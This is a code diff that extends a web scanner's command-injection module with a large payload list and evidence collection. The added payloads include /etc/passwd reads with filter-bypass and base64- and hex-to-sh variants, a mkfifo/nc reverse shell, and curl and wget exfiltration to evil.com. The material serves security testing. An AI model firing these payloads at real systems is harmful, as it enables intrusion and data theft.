@@ -10,6 +10,7 @@ from .base import BaseScanner
 from ..models.scan import ScanTarget
 from ..models.finding import Finding, FindingSeverity, FindingCategory
 from ..models.scan_mode import ScanMode
+from ..utils.evidence_collector import EvidenceCollector
 
 import logging
 logger = logging.getLogger(__name__)
@@ -32,51 +33,136 @@ class CommandInjectionScanner(BaseScanner):
             enabled=enabled,
             scan_mode=scan_mode
         )
-        self.session = requests.Session()
-        self.session.verify = False
-        self.session.headers.update({
-            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
-        })
+        # Use OPSEC-enabled session helper
+        from ..utils.scanner_session import create_scanner_session
+        self.session = create_scanner_session()
         self.session.timeout = 10
         
-        # Command injection payloads (time-based and output-based)
+        # Comprehensive command injection payloads (time-based and output-based)
+        # Includes various injection points, encodings, and filter bypasses
         self.command_payloads = [
-            # Time-based detection (sleep commands)
+            # Time-based detection (sleep commands) - Linux/Unix
             ('; sleep 5', 'sleep'),
             ('| sleep 5', 'sleep'),
             ('& sleep 5', 'sleep'),
             ('`sleep 5`', 'sleep'),
             ('$(sleep 5)', 'sleep'),
+            ('|| sleep 5', 'sleep'),
+            ('&& sleep 5', 'sleep'),
             ('; ping -c 3 127.0.0.1', 'ping'),
             ('| ping -c 3 127.0.0.1', 'ping'),
+            ('& ping -c 3 127.0.0.1', 'ping'),
+            ('; sleep $(whoami|wc -c)', 'sleep_calc'),
+            ('| sleep $(id|wc -c)', 'sleep_calc'),
             
-            # Output-based detection (command output in response)
+            # Output-based detection (command output in response) - Linux/Unix
             ('; echo "COMMAND_INJECTION_TEST"', 'echo'),
             ('| echo "COMMAND_INJECTION_TEST"', 'echo'),
             ('& echo "COMMAND_INJECTION_TEST"', 'echo'),
             ('`echo "COMMAND_INJECTION_TEST"`', 'echo'),
             ('$(echo "COMMAND_INJECTION_TEST")', 'echo'),
+            ('|| echo "COMMAND_INJECTION_TEST"', 'echo'),
+            ('&& echo "COMMAND_INJECTION_TEST"', 'echo'),
             ('; whoami', 'whoami'),
             ('| whoami', 'whoami'),
+            ('& whoami', 'whoami'),
+            ('`whoami`', 'whoami'),
+            ('$(whoami)', 'whoami'),
             ('; id', 'id'),
             ('| id', 'id'),
+            ('& id', 'id'),
+            ('`id`', 'id'),
+            ('$(id)', 'id'),
             ('; uname -a', 'uname'),
             ('| uname -a', 'uname'),
+            ('& uname -a', 'uname'),
+            ('; hostname', 'hostname'),
+            ('| hostname', 'hostname'),
+            ('; pwd', 'pwd'),
+            ('| pwd', 'pwd'),
+            ('; ls', 'ls'),
+            ('| ls', 'ls'),
+            ('; cat /etc/passwd', 'cat_passwd'),
+            ('| cat /etc/passwd', 'cat_passwd'),
             
             # Windows-specific
             ('; timeout /t 5', 'timeout'),
             ('| timeout /t 5', 'timeout'),
             ('& timeout /t 5', 'timeout'),
-            ('; echo COMMAND_INJECTION_TEST', 'echo'),
-            ('| echo COMMAND_INJECTION_TEST', 'echo'),
+            ('|| timeout /t 5', 'timeout'),
+            ('&& timeout /t 5', 'timeout'),
+            ('; ping 127.0.0.1 -n 5', 'ping_win'),
+            ('| ping 127.0.0.1 -n 5', 'ping_win'),
+            ('; echo COMMAND_INJECTION_TEST', 'echo_win'),
+            ('| echo COMMAND_INJECTION_TEST', 'echo_win'),
+            ('& echo COMMAND_INJECTION_TEST', 'echo_win'),
+            ('; whoami', 'whoami_win'),
+            ('| whoami', 'whoami_win'),
+            ('& whoami', 'whoami_win'),
+            ('; ipconfig', 'ipconfig'),
+            ('| ipconfig', 'ipconfig'),
+            ('; dir', 'dir'),
+            ('| dir', 'dir'),
+            ('; type C:\\Windows\\win.ini', 'type_file'),
+            ('| type C:\\Windows\\win.ini', 'type_file'),
             
             # Code injection (PHP, Python, etc.)
             ('; php -r "echo 12345;"', 'php'),
             ('| php -r "echo 12345;"', 'php'),
+            ('& php -r "echo 12345;"', 'php'),
+            ('`php -r "echo 12345;"`', 'php'),
+            ('$(php -r "echo 12345;")', 'php'),
             ('; python -c "print(12345)"', 'python'),
             ('| python -c "print(12345)"', 'python'),
+            ('& python -c "print(12345)"', 'python'),
+            ('`python -c "print(12345)"`', 'python'),
+            ('$(python -c "print(12345)")', 'python'),
+            ('; python3 -c "print(12345)"', 'python3'),
             ('; perl -e "print 12345"', 'perl'),
             ('| perl -e "print 12345"', 'perl'),
+            ('; ruby -e "puts 12345"', 'ruby'),
+            ('| ruby -e "puts 12345"', 'ruby'),
+            ('; node -e "console.log(12345)"', 'node'),
+            ('| node -e "console.log(12345)"', 'node'),
+            
+            # Filter bypass attempts
+            (';cat /etc/passwd', 'cat_nospace'),
+            (';cat${IFS}/etc/passwd', 'cat_ifs'),
+            (';cat$IFS/etc/passwd', 'cat_ifs_var'),
+            ('|cat${IFS}/etc/passwd', 'cat_ifs_pipe'),
+            (';cat<>/etc/passwd', 'cat_redirect'),
+            (';${PATH:0:1}cat /etc/passwd', 'cat_path_var'),
+            (';${LS_COLORS:10:1}cat /etc/passwd', 'cat_ls_var'),
+            
+            # Base64 encoded (for filters)
+            (';echo Y29tbWFuZCBpbmplY3Rpb24gdGVzdAo=|base64 -d|sh', 'base64'),
+            ('|echo Y29tbWFuZCBpbmplY3Rpb24gdGVzdAo=|base64 -d|sh', 'base64_pipe'),
+            
+            # Hex encoded
+            (';echo 636174202f6574632f706173737764|xxd -r -p|sh', 'hex'),
+            ('|echo 636174202f6574632f706173737764|xxd -r -p|sh', 'hex_pipe'),
+            
+            # Command substitution variations
+            ('$(whoami)', 'cmd_sub_var'),
+            ('`whoami`', 'cmd_sub_backtick'),
+            ('$(echo${IFS}test)', 'cmd_sub_spaces'),
+            ('`echo${IFS}test`', 'cmd_sub_backtick_spaces'),
+            
+            # Arithmetic expansion (bash)
+            ('$((1+1))', 'arithmetic'),
+            ('$(($(whoami|wc -c)))', 'arithmetic_cmd'),
+            
+            # Process substitution (bash)
+            ('<(echo test)', 'process_sub'),
+            ('>(echo test)', 'process_sub_output'),
+            
+            # Named pipes
+            (';mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 127.0.0.1 4444 >/tmp/f', 'reverse_shell'),
+            
+            # Curl/wget for data exfiltration
+            (';curl http://evil.com/$(whoami)', 'curl_exfil'),
+            ('|curl http://evil.com/$(whoami)', 'curl_exfil_pipe'),
+            (';wget http://evil.com/$(whoami)', 'wget_exfil'),
         ]
     
     def is_available(self) -> bool:
@@ -253,6 +339,15 @@ class CommandInjectionScanner(BaseScanner):
                     else:
                         severity = FindingSeverity.HIGH
                     
+                    # Collect evidence
+                    evidence_data = EvidenceCollector.collect_request_response(
+                        response,
+                        request_url=test_url if method == 'GET' else url,
+                        request_method=method
+                    )
+                    evidence_str = EvidenceCollector.format_evidence_string(evidence_data)
+                    evidence_str += f"\nPayload: {payload}\nPayload Type: {payload_type}"
+                    
                     findings.append(Finding(
                         title=f"Command Injection Vulnerability in {param_name} Parameter",
                         description=f"Command injection vulnerability detected in the '{param_name}' parameter ({method}). "
@@ -260,10 +355,11 @@ class CommandInjectionScanner(BaseScanner):
                                   f"Detection method: {exploitation_details.get('detection_method', 'unknown')}.",
                         severity=severity,
                         category=FindingCategory.EXPLOITATION,
-                        exploitation_details=exploitation_details_str,
                         source_scanner="command_injection",
                         source_id=f"cmd_injection_{param_name}_{method}",
-                        url=url if method == 'GET' else f"{url} (POST)",
+                        url=test_url if method == 'GET' else url,
+                        evidence=evidence_str,
+                        exploitation_details=exploitation_details_str,
                         remediation=f"Sanitize and validate all user input in the '{param_name}' parameter. "
                                    f"Use parameterized queries and avoid executing system commands with user input. "
                                    f"Implement input whitelisting and use safe APIs for system operations.",
@@ -274,6 +370,7 @@ class CommandInjectionScanner(BaseScanner):
                             "payload_type": payload_type,
                             "detection_method": exploitation_details.get('detection_method', 'unknown'),
                             "vulnerable": True,
+                            "evidence_data": evidence_data,
                         },
                         references=[
                             "https://owasp.org/www-community/attacks/Command_Injection",
